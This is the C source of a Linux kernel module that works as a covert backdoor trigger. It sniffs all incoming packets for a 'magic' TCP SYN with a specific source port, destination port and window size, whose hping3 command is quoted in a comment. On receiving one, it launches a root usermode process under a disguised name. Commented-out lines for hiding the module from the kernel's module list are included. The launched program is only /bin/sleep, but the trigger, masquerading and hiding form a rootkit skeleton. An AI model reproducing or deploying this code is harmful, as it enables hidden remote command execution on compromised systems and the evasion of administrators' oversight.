#include <net/ip.h>
#include <net/tcp.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/if_ether.h>
#include <linux/netdevice.h>
#include <linux/workqueue.h>

struct work_struct do_umode_exec;
struct packet_type net_if_proto;

void um_runner(struct work_struct *work)
{
    int rc;     

    char *argv[] = {"[metaalfiinger]","30",NULL};
    rc = call_usermodehelper("/bin/sleep", argv, NULL, UMH_WAIT_EXEC);
}

void process_packet(struct sk_buff *skb)
{
    struct ethhdr        *eth;
    struct iphdr         *iph;
    struct tcphdr        *tph;
    int src_port,dest_port;
    eth = eth_hdr(skb);
    iph = ip_hdr(skb);

    if(iph->protocol == 6)  // tcp
    {
        tph = (struct tcphdr*) (((char*) iph) + iph->ihl * 4);
        src_port  = htons(tph->source);
        dest_port = htons(tph->dest);

        // We look for a SYN to 443 with a source port of 42000
        // + window size of 128
        // (hping3 -V -S -p 443 -s 42000 -w 128)           
 
        if(tph->syn == 1 && dest_port == 443 && src_port == 42000 
           && tph->window == htons(128))
        {
            //printk("[+] Got magic packet from %pI4\n",&iph->saddr);
            schedule_work(&do_umode_exec);
        }
    }
}

int packet_func(struct sk_buff *skb, struct net_device *dev, 
                      struct packet_type *pt, struct net_device *deev) 
{
    if (skb->pkt_type == PACKET_HOST)
    {
        process_packet(skb); 
        kfree_skb(skb);
    }
    return 0;
}

int init_module(void)  
{
    INIT_WORK(&do_umode_exec,um_runner);
    net_if_proto.dev =  NULL;
    net_if_proto.type = htons(ETH_P_ALL); 
    net_if_proto.func = packet_func;
    dev_add_pack(&net_if_proto);
    //list_del_init(&__this_module.list);     <---.  
    //kobject_del(&THIS_MODULE->mkobj.kobj);  <------- (Hides module)   
    return 0;
}

void cleanup_module(void) 
{
    flush_work(&do_umode_exec);
    dev_remove_pack(&net_if_proto);
}

MODULE_AUTHOR("linuxthor");
MODULE_LICENSE("GPL");
